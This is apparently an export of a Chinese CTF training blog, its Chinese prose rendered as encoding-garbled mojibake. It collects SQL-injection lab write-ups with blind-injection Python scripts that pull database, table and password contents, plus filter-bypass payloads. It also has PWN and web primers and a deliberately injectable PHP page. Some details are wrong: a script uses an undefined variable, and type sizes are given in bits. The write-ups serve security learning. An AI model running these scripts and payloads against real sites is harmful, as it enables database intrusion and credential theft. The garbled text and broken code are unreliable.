dumb;i-kill-you;p@ssword;crappy;stupidity;genious;mob!le;admin;admin1;admin2;admin3;dumbo;admin4 æœ€åçœ‹ä¸€çœ‹ç½‘é¡µæºç ï¼Œå…¶å®å®ç°è¿˜æ˜¯å¾ˆç®€å•çš„ less-9æ ¹æ®æµ‹è¯•åˆ¤æ–­ä¸ºæ—¶é—´ç›²æ³¨ è„šæœ¬å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import requestsurl = \"http://127.0.0.1/sqli-labs-master/less-9/index.php?id=\"payload = \"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();\"def get_databse(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr(database(),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Database: \", res)def get_tables(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Table names: \", res)def get_columns(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='uagents' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Column names: \", res)def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Flag: \", res)if __name__ == '__main__': # get_databse() # åº“åï¼šsecurity # get_tables() # åˆ—åï¼šemails;referers;uagents;users # get_columns() # è¡¨åï¼š1.id;email_id 2.id;referer;ip_address(ip_addkess) 3.id;uagent;ip_address;username 4.id;username(usernahe);password(passkord) # ç”±äºæ—¶é—´ç›²æ³¨ä¼šå—åˆ°ç½‘ç»œçš„å½±å“ï¼Œéœ€è¦å¤šè¯•å‡ æ¬¡æ¥æé«˜ç»“æœçš„ç²¾ç¡®åº¦ # æ ¹æ®ä»¥ä¸Šçš„ç»“æœå¯ä»¥è®¤ä¸ºéœ€è¦æ‰¾çš„ä¸œè¥¿åœ¨usersè¡¨ä¸­çš„passwordå­—æ®µ get_flag() # dumb;i0kill-you;p@ssword;crappyustupidity;genious;mob!le;admie;admin1;admin2;admin3;dumbo0dmin4 æºç å¦‚ä¸‹ï¼š less-25å°±æ˜¯è¿‡æ»¤äº†ANDå’ŒORï¼Œå…¶ä»–çš„è¯å’ŒDVWAçš„LOW LEVEL SQL INJECTIONæ˜¯ä¸€æ ·çš„ è¿™é‡Œinformation_schemaåº“åä¸­ä¹Ÿæœ‰orï¼Œè¦è®°å¾—åŒå†™ passwordä¸­çš„orä¹Ÿä¼šè¢«è¿‡æ»¤ less-26å·²ç»èƒ½çŒœåˆ°è¡¨ä¸­æœ‰ä¸‰ä¸ªå­—æ®µï¼Œæ‰€ä»¥å°±ä¸æµ‹å­—æ®µï¼Œç„¶åç”¨%A0æ›¿ä»£ç©ºæ ¼ï¼Œç”¨%26%26(&amp;&amp;)æ›¿ä»£ANDï¼Œå†™å‡ºpayloadï¼š 10%27%A0union%A0select%A01,database(),3%26%26%271 å› ä¸ºæ³¨é‡Šç¬¦éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¯­å¥æœ€åé€šè¿‡åŠ ä¸Šâ€œand â€˜1â€æ¥ç»•è¿‡ ç½‘é¡µæºç æ˜¯è¿™æ ·çš„ï¼Œè¿‡æ»¤äº†å¥½å¤šä¸œè¥¿ï¼š less-27ç”¨å¤§å°å†™äº¤æ›¿æ¥ç»•è¿‡è¿‡æ»¤ï¼Œå…¶ä»–è¿‡æ»¤å’Œä¸Šä¸€é¢˜ç›¸åŒï¼Œäºæ˜¯ç›´æ¥å†™å‡ºpayloadï¼š 10%27uNion%a0SeleCt%a01,database(),3%a0%26%26%271 ç½‘é¡µæºç ï¼š å®éªŒå§ç®€å•çš„sqlæ³¨å…¥ç®€å•çš„sqlæ³¨å…¥é€šè¿‡æ³¨å…¥è·å¾—flagå€¼ï¼ˆæäº¤æ ¼å¼ï¼šflag{}ï¼‰ã€‚è§£é¢˜é“¾æ¥ è¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œéœ€è¦å°è¯•å¤šæ¬¡ä»¥åæ‰èƒ½æ„é€ å‡ºæ­£ç¡®çš„payloadã€‚ä»¥ä¸‹ä¸ºæ¯ä¸€æ­¥çš„payloadã€‚ è·å–åº“åï¼š 1' unionunion selectselect database() ' è·å–è¡¨åï¼š 1' unionunion selectselect table_name fromfrom information_schema.tables wherewhere table_table_schemaschema='web1 è·å–åˆ—åï¼š 1' unionunion selectselect column_namcolumn_namee fromfrom information_schema.coluinformation_schema.columnsmns wherewhere table_table_schemaschema='web1' andand table_name='flag å¾—åˆ°flagï¼š 1' unionunion selectselect flag fromfrom web1.flag wherewhere '1'='1 ç®€å•çš„sqlæ³¨å…¥3mysqlæŠ¥é”™æ³¨å…¥æ ¼å¼ï¼šflag{}è§£é¢˜é“¾æ¥ ä¾æ¬¡è¾“å…¥1 and 1=1å’Œ1 and 1=2ï¼Œå‘ç°å­˜åœ¨å¸ƒå°”ç›²æ³¨ã€‚ ç»è¿‡ä¸Šä¸€é¢˜ç›´æ¥çŒœæµ‹è¡¨åä¸ºflagï¼ˆå¦‚æœå’Œä¸Šä¸€é¢˜ä¸€æ ·å°±å¯ä»¥ç›´æ¥å†™çˆ†ç ´flagçš„è„šæœ¬äº†ï¼‰ï¼Œè¿”å›helloï¼Œè¯´æ˜ç¡®å®æœ‰flagè¿™ä¸ªè¡¨ã€‚é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥å†™è„šæœ¬çˆ†ç ´äº†ã€‚ ç›´æ¥çˆ†ç ´flagè¡¨flagå­—æ®µå¾—åˆ°flagã€‚è„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819import requests, repayload = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#123;&#125;_!@#$^&amp;*().-\"url = \"http://ctf5.shiyanbar.com/web/index_3.php\"def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"?id=1' and (select flag from flag) like '&#123;&#125;&#123;&#125;%'%23\".format(name, ch) r = requests.get(url + sql) if r.text.find('Hello!') != -1: res += ch print(res) break print(\"flag: \" + res)if __name__ == '__main__': get_flag() å‚è€ƒç½‘ç«™https://www.2cto.com/database/201607/529000.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"PWNå…¥é—¨ï¼ˆä¸€ï¼‰","slug":"PWNå…¥é—¨ï¼ˆä¸€ï¼‰","date":"2018-07-03T02:32:36.000Z","updated":"2019-02-03T09:45:57.398Z","comments":true,"path":"2018/07/03/PWNå…¥é—¨ï¼ˆä¸€ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/03/PWNå…¥é—¨ï¼ˆä¸€ï¼‰/","excerpt":"å­¦å¥½äºŒè¿›åˆ¶å¿…é¡»å…ˆæ‰“å¥½åŸºç¡€ã€‚","text":"å­¦å¥½äºŒè¿›åˆ¶å¿…é¡»å…ˆæ‰“å¥½åŸºç¡€ã€‚ äº†è§£äº†ç”µè„‘ä¸­çš„ç¨‹åºå¦‚ä½•è¿è¡Œï¼Œä»¥åŠæ ˆåœ¨ç¨‹åºè¿è¡Œæ—¶æ˜¯å¦‚ä½•å˜åŒ–çš„ã€‚ ç¨‹åºè¿è¡ŒåŸºæœ¬åŸç†CPUè®¿é—®å¿«æ…¢çš„é€Ÿåº¦ä¾æ¬¡ä¸ºï¼šå¯„å­˜å™¨-&gt;ç¼“å­˜-&gt;å†…å­˜-&gt;ç¡¬ç›˜ã€‚ ç¡¬ç›˜ç”¨äºæ°¸ä¹…å­˜å‚¨æ‰€æœ‰çš„æ•°æ®ã€‚å½“ç¨‹åºè¿è¡Œæ—¶ï¼Œç¨‹åºå†…å®¹ä¼šè¢«æ”¾è¿›å†…å­˜ä¸­ï¼Œå ç”¨å†…å­˜çš„ç©ºé—´ã€‚ç¼“å­˜å’Œå¯„å­˜å™¨åˆ™ç›¸å¯¹é€Ÿåº¦æ›´å¿«ï¼Œä½œä¸ºæ•°æ®å’ŒCPUä¹‹é—´è¿æ¥çš„æ¡¥æ¢ã€‚ å¯„å­˜å™¨CPUå†…éƒ¨ç”¨æ¥å­˜æ”¾æ•°æ®çš„ä¸€äº›å°å‹å­˜å‚¨åŒºåŸŸï¼Œç”¨æ¥æš‚æ—¶å­˜æ”¾å‚ä¸è¿ç®—çš„æ•°æ®å’Œè¿ç®—ç»“æœã€‚å’ŒCPUé€Ÿåº¦ç›¸å½“ï¼Œç©ºé—´æ¯”è¾ƒå°åœ¨kbçº§åˆ«ã€‚CPUè®¿é—®å¯„å­˜å™¨çš„é€Ÿåº¦æ˜¯æœ€å¿«çš„ã€‚å¯„å­˜å™¨æ˜¯ä¸€ç§å®¹é‡æœ‰é™çš„å­˜å‚¨å™¨ï¼Œå¹¶ä¸”éå¸¸å°ï¼Œå› æ­¤åªæŠŠä¸€äº›è®¡ç®—æœºçš„æŒ‡ä»¤ç­‰ä¸€äº›è®¡ç®—æœºé¢‘ç¹ç”¨åˆ°çš„æ•°æ®å­˜å‚¨åœ¨å…¶ä¸­ï¼ŒåŠ å¿«ç›´æ¥åŒå†…å­˜è¯»å–æŒ‡ä»¤å’Œè¯»å†™æ•°æ®çš„é€Ÿåº¦ã€‚ ç¼“å­˜ï¼ˆCACHEï¼‰å­˜åœ¨äºå†…å­˜ä¸CPUä¹‹é—´çš„å­˜å‚¨å™¨ï¼Œå®¹é‡æ¯”è¾ƒå°ä½†é€Ÿåº¦æ¯”å†…å­˜é«˜å¾—å¤šï¼Œæ¥è¿‘äºCPUçš„é€Ÿåº¦ï¼Œæ¯”å¯„å­˜å™¨è¦æ…¢1å€å·¦å³ï¼Œä½†æ˜¯ç©ºé—´å¯ä»¥è¾¾åˆ°MBçº§åˆ«ã€‚é«˜é€Ÿç¼“å­˜åœ¨CPUè¦é¢‘ç¹è®¿é—®å†…å­˜ä¸­çš„ä¸€äº›æ•°æ®æ—¶ï¼Œå¦‚æœæ¯æ¬¡éƒ½ä»å†…å­˜ä¸­å»è¯»ï¼ŒèŠ±è´¹çš„æ—¶é—´ä¼šæ›´å¤šï¼Œå› æ­¤åœ¨å¯„å­˜å™¨å’Œå†…å­˜ä¹‹é—´æœ‰äº†ç¼“å­˜ï¼ŒæŠŠCPUè¦é¢‘ç¹è®¿é—®çš„ä¸€äº›æ•°æ®å­˜å‚¨åœ¨ç¼“å†²ä¸­ï¼Œè¿™æ ·æ•ˆç‡å°±ä¼šæ›´é«˜ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¼“å†²çš„å¤§å°ä¹Ÿæ˜¯å¾ˆå°çš„ï¼Œä¸èƒ½å­˜æ”¾å¤§é‡çš„æ•°æ®ã€‚ç¼“å­˜åˆå¯ä»¥åˆ†ä¸ºä¸€çº§å’ŒäºŒçº§ç¼“å­˜ï¼Œä¸€çº§çš„é€Ÿåº¦å¤§äºäºŒçº§çš„é€Ÿåº¦ã€‚CPUå‘å†…å­˜è¯»å–æ•°æ®æ—¶ï¼Œé¦–å…ˆæŸ¥è¯¢ç¼“å­˜åŒºæ˜¯å¦æœ‰å¯¹åº”æ•°æ®ï¼Œå¦‚æœæœ‰åˆ™ç›´æ¥è¯»å–ï¼Œæ²¡æœ‰å†ä»å†…å­˜ä¸­è¯»å–ã€‚ å†…å­˜è®¡ç®—æœºè¿è¡Œè¿‡ç¨‹ä¸­çš„å­˜å‚¨ä¸»åŠ›ï¼Œç”¨äºå­˜å‚¨ æŒ‡ä»¤ï¼ˆç¼–è¯‘å¥½çš„ä»£ç æ®µï¼‰ï¼Œè¿è¡Œä¸­çš„å„ä¸ªé™æ€ï¼ŒåŠ¨æ€ï¼Œä¸´æ—¶å˜é‡ï¼Œå¤–éƒ¨æ–‡ä»¶çš„æŒ‡é’ˆç­‰ç­‰ã€‚å¯„å­˜å™¨å’Œé«˜é€Ÿç¼“å­˜åªæ˜¯åŠ é€Ÿå­˜å‚¨é€Ÿåº¦çš„ä¸­é—´éƒ¨ä»¶ï¼ŒåŸå§‹è¿è¡Œæ–‡ä»¶éƒ½æ˜¯å…ˆåŠ å…¥åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤å†…å­˜çš„å¤§å°å†³å®šäº†ä¸€ä¸ªå¯è¿è¡Œç¨‹åºçš„æœ€å¤§å¤§å°ã€‚é€Ÿåº¦æ¯”ç¼“å­˜è¦æ…¢10å€å·¦å³ï¼Œä½†æ˜¯ç©ºé—´å¯ä»¥è¾¾åˆ°GBçº§åˆ«ï¼Œå½“å‰ä¸ªäººç”µè„‘ä¸€èˆ¬éƒ½ä¸å°äº4Gã€‚åˆ†ä¸ºåªè¯»ï¼ˆROMï¼‰å’Œéšæœºå­˜å‚¨å™¨ï¼ˆRAMï¼‰ã€‚ ç¡¬ç›˜ç”¨æ¥å­˜å‚¨éœ€è¦æ°¸ä¹…å­˜å‚¨çš„æ–‡ä»¶ï¼Œå½’å…¥å¤–å­˜å‚¨å™¨ï¼Œè®¿é—®é€Ÿåº¦æ¯”å†…å­˜è¦æ…¢ä¸Šä¸‡å€ï¼Œä½†æ˜¯ä»·æ ¼ä¹Ÿæ¯”è¾ƒä¾¿å®œï¼Œç©ºé—´ä¹Ÿå¾ˆå¤§ã€‚ ASCIIç  123456#include&lt;stdio.h&gt;int main()&#123; printf(\"%d\\n\", 'A'); printf(\"%c\\n\", 65);&#125; å°ç«¯åºæ•°æ®çš„é«˜ä½å­—èŠ‚å­˜æ”¾åœ¨åœ°å€çš„é«˜ç«¯ï¼Œä½ä½å­—èŠ‚å­˜æ”¾åœ¨åœ°å€çš„ä½ç«¯ ä¸åŒç±»å‹æ•°æ®çš„å­—èŠ‚é•¿åº¦ sizeof(int): 4 bit sizeof(short): 2 bit sizeof(float): 4 bit sizeof(double): 8 bit sizeof(char): 1 bit ä¸åŒç±»å‹æ•°æ®çš„å°ç«¯åºå­˜å‚¨æ–¹å¼ int 0x12345678: 78 56 34 12 char [] â€œ1234â€: 30 31 32 33 00 short 0xdead: ad de short 0x12345678: 34 12 78 56 æ ˆ å…ˆè¿›åå‡º ä»é«˜åœ°å€å‘ä½åœ°å€å»¶ä¼¸ ä½œç”¨ï¼š æš‚æ—¶ä¿å­˜å˜é‡ è°ƒç”¨å‡½æ•°æ—¶ä¼ é€’å‚æ•° ä¿å­˜å‡½æ•°è¿”å›åœ°å€ è°ƒè¯•SWAPç¨‹åº12345678910111213141516#include&lt;stdio.h&gt;void swap(int *aa, int *bb)&#123; int cc = *aa; *aa = *bb; *bb = cc;&#125;int main()&#123; int a = 100, b = 2; swap(&amp;a, &amp;b); printf(\"%d %d\\n\", a, b); return 0;&#125; è¡¨æ ¼æ¨¡æ‹Ÿç¨‹åºæ‰§è¡Œæ—¶çš„æ ˆï¼š ADDRESS VALUE NAME 0x7ffee7574978 2 b 0x7ffee7574974 100 a 0x7ffee7574970 0x7ffee7574978 bb 0x7ffee757496c 0x7ffee7574974 aa 0x7ffee7574968 ?? cc æµç¨‹å›¾æ¨¡æ‹Ÿç¨‹åºæ‰§è¡Œæ—¶çš„æ ˆï¼š ä»¥ä¸‹ä¸ºåœ¨macä¸‹åæ±‡ç¼–å‡ºçš„ä»£ç ï¼ŒåŸºæœ¬å’Œlinuxä¸‹çš„ä¸€è‡´ï¼Œä½†æ˜¯å’Œwindowsä¸‹çš„æœ‰ä¸€å®šåŒºåˆ«ï¼š 12345678910111213141516 0x10958ff10 &lt;+0&gt;: pushq %rbp 0x10958ff11 &lt;+1&gt;: movq %rsp, %rbp 0x10958ff14 &lt;+4&gt;: movq %rdi, -0x8(%rbp) 0x10958ff18 &lt;+8&gt;: movq %rsi, -0x10(%rbp)-&gt; 0x10958ff1c &lt;+12&gt;: movq -0x8(%rbp), %rsi 0x10958ff20 &lt;+16&gt;: movl (%rsi), %eax 0x10958ff22 &lt;+18&gt;: movl %eax, -0x14(%rbp) 0x10958ff25 &lt;+21&gt;: movq -0x10(%rbp), %rsi 0x10958ff29 &lt;+25&gt;: movl (%rsi), %eax 0x10958ff2b &lt;+27&gt;: movq -0x8(%rbp), %rsi 0x10958ff2f &lt;+31&gt;: movl %eax, (%rsi) 0x10958ff31 &lt;+33&gt;: movl -0x14(%rbp), %eax 0x10958ff34 &lt;+36&gt;: movq -0x10(%rbp), %rsi 0x10958ff38 &lt;+40&gt;: movl %eax, (%rsi) 0x10958ff3a &lt;+42&gt;: popq %rbp 0x10958ff3b &lt;+43&gt;: retq Linuxä¸‹é‡‡ç”¨çš„æ˜¯ATï¼†Tçš„æ±‡ç¼–è¯­æ³•æ ¼å¼ï¼ŒWindowsä¸‹é¢é‡‡ç”¨çš„æ˜¯Intelæ±‡ç¼–è¯­æ³•æ ¼å¼ã€‚äºŒè€…çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼š æŒ‡ä»¤æ“ä½œæ•°çš„èµ‹å€¼æ–¹å‘æ˜¯ä¸åŒçš„ Intelï¼šç¬¬ä¸€ä¸ªæ˜¯ç›®çš„æ“ä½œæ•°ï¼Œç¬¬äºŒä¸ªæ˜¯æºæ“ä½œæ•° ATï¼†Tï¼šç¬¬ä¸€ä¸ªæ˜¯æºæ“ä½œæ•°ï¼Œç¬¬äºŒä¸ªæ˜¯ç›®çš„æ“ä½œæ•° æŒ‡ä»¤å‰ç¼€ ATï¼†Tï¼šå¯„å­˜å™¨å‰è¾¹è¦åŠ ä¸Šï¼…ï¼Œç«‹å³æ•°å‰è¦åŠ ä¸Š$ Intelï¼šæ²¡æœ‰è¿™æ–¹é¢çš„è¦æ±‚ å†…å­˜å•å…ƒæ“ä½œæ•° Intelï¼šåŸºåœ°å€ä½¿ç”¨[] AT&amp;Tï¼šåŸºåœ°å€ä½¿ç”¨() æ¯”å¦‚ï¼šintelä¸­mov ax, [bx]ï¼›AT&amp;Tä¸­movl (%eax), %ebx æ“ä½œç çš„åç¼€ AT&amp;Tä¸­æ“ä½œç åé¢æœ‰ä¸€ä¸ªåç¼€å­—æ¯: l 32ä½, w 16ä½, b 8ä½ Intelå´ä½¿ç”¨äº†åœ¨æ“ä½œæ•°å‰é¢åŠ dword ptr, word ptr, byte ptrçš„æ ¼å¼ ä¾‹å¦‚: mov al, bl(Intel)ï¼›movb %bl, %al(AT&amp;T) ATï¼†Tä¸­è·³è½¬æŒ‡ä»¤æ ‡å·åçš„åç¼€è¡¨ç¤ºè·³è½¬æ–¹å‘ï¼Œfè¡¨ç¤ºå‘å‰ï¼Œbè¡¨ç¤ºå‘å å‚è€ƒç½‘ç«™https://blog.csdn.net/sinat_37138973/article/details/79012270https://blog.csdn.net/younkerjqb/article/details/53432422https://blog.csdn.net/chuchus/article/details/38469403","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"WEBå…¥é—¨ï¼ˆä¸€ï¼‰","slug":"WEBå…¥é—¨ï¼ˆä¸€ï¼‰","date":"2018-07-02T04:38:52.000Z","updated":"2019-02-03T09:45:39.899Z","comments":true,"path":"2018/07/02/WEBå…¥é—¨ï¼ˆä¸€ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/02/WEBå…¥é—¨ï¼ˆä¸€ï¼‰/","excerpt":"ä»Šå¤©ä¸Šåˆæ˜¯è‘›å¤§ä½¬çš„è¯¾ï¼Œç»§ç»­å¥½å¥½åšç¬”è®°ã€‚","text":"ä»Šå¤©ä¸Šåˆæ˜¯è‘›å¤§ä½¬çš„è¯¾ï¼Œç»§ç»­å¥½å¥½åšç¬”è®°ã€‚ å¯¹æ•°æ®åº“çš„æ¦‚å¿µæ›´æ¸…æ¥šäº†ï¼Œé€šè¿‡è‡ªå·±æ­å»ºä¸€ä¸ªæœ‰æ³¨å…¥çš„ç½‘é¡µå¯¹PHPå’ŒHTMLçš„åŸºæœ¬å‡½æ•°æœ‰äº†æ›´å¥½çš„ç†è§£ã€‚ PHPPHPè„šæœ¬ä»¥123456789## æ³¨é‡Š```PHP// å•è¡Œæ³¨é‡Š# å•è¡Œæ³¨é‡Š/*å¤šè¡Œæ³¨é‡Š*/ å˜é‡è§„åˆ™ å˜é‡ä»¥$ç¬¦å·å¼€å¤´ å˜é‡åç§°å¿…é¡»ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ å˜é‡åç§°ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ å˜é‡åç§°åªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦å’Œä¸‹åˆ’çº¿ï¼ˆA-Zã€a-zã€0-9ä»¥åŠ_ï¼‰ å˜é‡åç§°å¯¹å¤§å°å†™æ•æ„Ÿ 1234567&lt;?php $a = 'I am a'; $b = 'I am b'; echo '$a'; echo '&lt;br&gt;'; echo \"$b\";?&gt; ä¸‰å±‚æ¶æ„ä¸­çš„ä¿¡æ¯æµ URLç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œæä¾›èµ„æºï¼ˆé€šå¸¸æ˜¯æ–‡æ¡£ï¼‰çš„è·¯å¾„æˆ–ä½ç½®ã€‚ç»“æ„å¦‚ä¸‹ï¼š 1åè®®://æˆæƒ/è·¯å¾„?æŸ¥è¯¢ GETè¯·æ±‚å’ŒPOSTè¯·æ±‚HTTPä¸­å®šä¹‰çš„å®¢æˆ·ç«¯å¯ä»¥å‘é€æœåŠ¡å™¨çš„ä¸¤ç§æ“ä½œ GETä»æœåŠ¡å™¨æŸ¥è¯¢æ•°æ®æ–¹å¼ï¼šç”¨?åˆ†å‰²urlå’ŒæŸ¥è¯¢çš„æ•°æ® POSTå‘æœåŠ¡å™¨ä¼ é€’æ•°æ®æ–¹å¼ï¼šé€šè¿‡formè¡¨å•ä¼ é€’ PHPä¸MYSQLGETæ–¹æ³•ä¼ é€’å‚æ•°12345678&lt;?php$id=$_GET['id'];if(!is_numeric($id))&#123; echo \"U r a hacker!&lt;br&gt;\";&#125;else&#123; echo \"Connecting database!&lt;br&gt;\";&#125;?&gt; PSï¼š123456789## POSTæ–¹æ³•ä¼ é€’å‚æ•°```php&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;Pls input ur id: &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;U r NO.&lt;?php echo $_POST[&apos;id&apos;]; ?&gt; visitor! ä¸mysqlç›¸å…³å‡½æ•°è¿æ¥æ•°æ®åº“username, password);```12345678910å‚æ•°|æè¿°:-:|:-:servername|å¯é€‰ã€‚è§„å®šè¦è¿æ¥çš„æœåŠ¡å™¨ï¼Œé»˜è®¤æ˜¯â€œlocalhost:3306â€username|å¯é€‰ã€‚è§„å®šç™»é™†æ‰€ä½¿ç”¨çš„ç”¨æˆ·åï¼Œé»˜è®¤æ˜¯æ‹¥æœ‰æœåŠ¡å™¨è¿›ç¨‹çš„ç”¨æˆ·åçš„åç§°password|å¯é€‰ã€‚è§„å®šç™»é™†æ‰€ç”¨çš„å¯†ç ï¼Œé»˜è®¤æ˜¯â€œâ€### é€‰å–æ•°æ®```mysql_query(query, connection); å‚æ•° æè¿° query å¿…éœ€ã€‚è§„å®šè¦å‘é€çš„sqlæŸ¥è¯¢ connection å¯é€‰ã€‚è§„å®šsqlè¿æ¥æ ‡è¯†ç¬¦ è®¾ç½®æ´»åŠ¨çš„æ•°æ®åº“connection);```123456789å‚æ•°|æè¿°:-:|:-:database|å¿…éœ€ã€‚è§„å®šè¦é€‰æ‹©çš„æ•°æ®åº“connection|å¯é€‰ã€‚è§„å®šmysqlè¿æ¥ï¼Œå¦‚æœªæŒ‡å®šï¼Œä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥### è·å–æ•°æ®```mysql_fetch_array(data, array_type); å‚æ•° æè¿° data å¯é€‰ã€‚è§„å®šè¦ä½¿ç”¨çš„æ•°æ®æŒ‡é’ˆ array_type å¯é€‰ã€‚è§„å®šè¿”å›ç»“æœ MYSQLå‘½ä»¤è¡ŒæŒ‡ä»¤æ›´æ”¹å¯†ç 12update mysql.user set password=password('test') where username='root';flush privileges; æŸ¥çœ‹æ•°æ®åº“1show databases; é€‰æ‹©æ•°æ®åº“1use mysql; æŸ¥çœ‹å½“å‰æ•°æ®åº“æ‰€æœ‰æ•°æ®è¡¨1show tables; æŸ¥çœ‹æŸå¼ è¡¨æ‰€æœ‰å­—æ®µä¿¡æ¯1desc users; åˆ›å»ºæ•°æ®åº“1create database mysql; åˆ é™¤æ•°æ®åº“1drop database mysql; åˆ›å»ºè¡¨åä¸ºusersçš„æ•°æ®è¡¨ï¼ˆå…¶ä¸­idä¸ºä¸»é”®è‡ªå¢ï¼‰123456create table users( id int auto_increment, username varchar(20), password varchar(50), primary key (`id`)); ä¿®æ”¹è¡¨å1alter table users rename to users2; å¾€è¡¨ä¸­æ’å…¥æ•°æ®1insert into users(...) value(...); æŸ¥è¯¢è¡¨ä¸­å­—æ®µçš„æ•°æ®ç±»å‹1show create table mysql; MYSQLç›¸å…³å‘½ä»¤åŠæ³¨é‡Šå‘½ä»¤ ANDï¼šæ‰€æœ‰ç”±ANDè¿æ¥çš„æ¡ä»¶éƒ½ä¸ºTRUEï¼ŒSQLè¯­å¥æ‰æ‰§è¡Œ ORï¼šåªè¦ORè¿æ¥çš„æ¡ä»¶é‡Œæœ‰ä¸€ä¸ªæ˜¯TRUEï¼ŒSQLè¯­å¥å°±ä¼šæ‰§è¡Œ UNION SELECTï¼šè”åˆæŸ¥è¯¢ GROUP BYï¼šè¡¨ç¤ºæŒ‰ç…§ç¬¬å‡ åˆ—è¿›è¡Œæ’åº GROUP_CONCATï¼šå°†æŸ¥è¯¢ç»“æœä»¥ä¸€è¡Œçš„å½¢å¼è¾“å‡º æ³¨é‡Š12345-- å•è¡Œæ³¨é‡Š# å•è¡Œæ³¨é‡Š/*å¤šè¡Œæ³¨é‡Š*/ SQLæ‰‹æ³¨ç»ƒä¹  åˆ¤æ–­æœ‰æ— æ³¨å…¥ç‚¹ åˆ¤æ–­æ³¨å…¥ç±»å‹ åˆ¤æ–­è¡¨ä¸­å­—æ®µæ•° UNIONæŸ¥è¯¢åº“å UNIONæŸ¥è¯¢è¡¨å UNIONæŸ¥è¯¢å­—æ®µå UNIONæŸ¥è¯¢å†…å®¹ï¼ˆå¾—åˆ°flagï¼‰ è‡ªå·±æ­å»ºä¸€ä¸ªPOSTæ–¹å¼çš„å­—ç¬¦å‹SQLæ³¨å…¥ç½‘ç«™æœ¬åœ°æ•°æ®åº“å¦‚ä¸‹ï¼š æºç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526&lt;?PHP$id = $_POST['id'];$conn = mysql_connect('127.0.0.1', 'root', 'root');if($conn)&#123; echo \"Connected success!&lt;br&gt;\";&#125;else&#123; echo \"Connected fail!&lt;br&gt;\";&#125;$db_selected = mysql_select_db('qf', $conn);$sql = \"select * from test1 where id='$id'\";$res = mysql_query($sql, $conn);while($row = mysql_fetch_array($res))&#123; echo \"username: \".$row['username'].\"&lt;br&gt;\"; echo \"age: \".$row['age'].\"&lt;br&gt;\"; echo \"sex: \".$row['sex'].\"&lt;br&gt;\";&#125;mysql_close($conn);echo \"ur sql is:\";echo \"select * from test1 where id='$id'\";?&gt; 1234&lt;form action=\"\" method=\"post\"&gt;Pls input ur id: &lt;input type=\"text\" name=\"id\" /&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"\", value=\"submit\"&gt;&lt;/form&gt; ä»¥ä¸‹ä¸ºåœ¨æœ¬åœ°æ³¨å…¥æ—¶çš„è¿‡ç¨‹ï¼Œä¸getæ–¹å¼çš„æ³¨å…¥è¿‡ç¨‹æ²¡æœ‰ä»€ä¹ˆå·®åˆ«ï¼Œæ‰€ä»¥çœå»äº†åˆ¤æ–­çš„è¿‡ç¨‹ï¼Œç›´æ¥æ³¨å…¥ æŸ¥è¯¢åº“å æŸ¥è¯¢è¡¨å æŸ¥è¯¢å­—æ®µå æŸ¥è¯¢å†…å®¹ï¼ˆå¾—åˆ°flagï¼‰","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"é€†å‘å…¥é—¨ï¼ˆä¸€ï¼‰","slug":"é€†å‘å…¥é—¨ï¼ˆä¸€ï¼‰","date":"2018-07-01T05:26:43.000Z","updated":"2019-02-03T09:40:54.973Z","comments":true,"path":"2018/07/01/é€†å‘å…¥é—¨ï¼ˆä¸€ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/01/é€†å‘å…¥é—¨ï¼ˆä¸€ï¼‰/","excerpt":"åŸºç¡€æ±‡ç¼–çŸ¥è¯†